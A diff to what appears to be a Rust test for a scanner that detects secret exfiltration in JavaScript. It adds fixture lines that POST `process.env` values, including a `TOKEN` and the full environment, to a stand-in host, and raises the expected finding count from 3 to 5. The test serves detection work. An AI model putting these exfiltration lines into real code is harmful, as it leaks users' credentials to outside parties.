@@ -1123,6 +1123,12 @@ fetch('https://example.invalid/assign', { method: 'POST', body: JSON.stringify(c
 const target = {};
 Object.assign(target, process.env);
 fetch('https://example.invalid/mutate', { method: 'POST', body: JSON.stringify(target) });
+const { TOKEN } = process.env;
+fetch('https://example.invalid/destructure', { method: 'POST', body: TOKEN });
+const { ...rest } = process.env;
+fetch('https://example.invalid/rest', { method: 'POST', body: JSON.stringify(rest) });
+const { NODE_ENV } = process.env;
+fetch('https://example.invalid/mode', { method: 'POST', body: NODE_ENV });
 const entries = Object.fromEntries(Object.entries(process.env));
 fetch('https://example.invalid/entries', { method: 'POST', body: JSON.stringify(entries) });"#,
     )
@@ -1143,7 +1149,7 @@ fetch('https://example.invalid/metrics', { method: 'POST', body: JSON.stringify(
         .iter()
         .filter(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
         .collect::<Vec<_>>();
-    assert_eq!(exfiltration.len(), 3, "{}", report["findings"]);
+    assert_eq!(exfiltration.len(), 5, "{}", report["findings"]);
     assert!(
         exfiltration
             .iter()
